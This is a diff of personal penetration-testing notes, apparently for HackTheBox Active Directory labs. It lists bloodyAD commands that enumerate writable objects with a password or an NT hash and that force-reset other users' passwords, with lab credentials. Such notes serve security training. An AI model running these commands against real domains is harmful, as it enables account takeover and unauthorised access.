@@ -3,7 +3,7 @@ https://www.hackingarticles.in/active-directory-penetration-testing-with-bloodya
 # 1. Apa object yang dapat kita modifikasi/tulis
 ```shell
 # Dengan password
-bloodyad --host 10.129.27.241 -d danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01' get writable
+bloodyad --host 10.129.36.106 -d danglingtree.htb -u jake.h -p 'NewPassword123' get writable
 
 # Dengan NT hash
 bloodyad --host 10.129.245.130 -d logging.htb -u 'msa_health$' -p:603fc24ee01a9409f83c9d1d701485c5 get writable
@@ -65,3 +65,9 @@ restore dengan nama SAM account
 ```shell
 bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set password "mark.davies" 'NewPass@123!'
 ```
+# 6. From Bloodhound
+## ForceChangePassword
+```shell
+bloodyad --host "10.129.36.106" -d "danglingtree.htb" -u "alex.o" -p "SunsetMountainPeak@2025" set password "jake.h" "NewPassword123"
+```
+![](Attachments/Pasted%20image%2020260908130804.png)
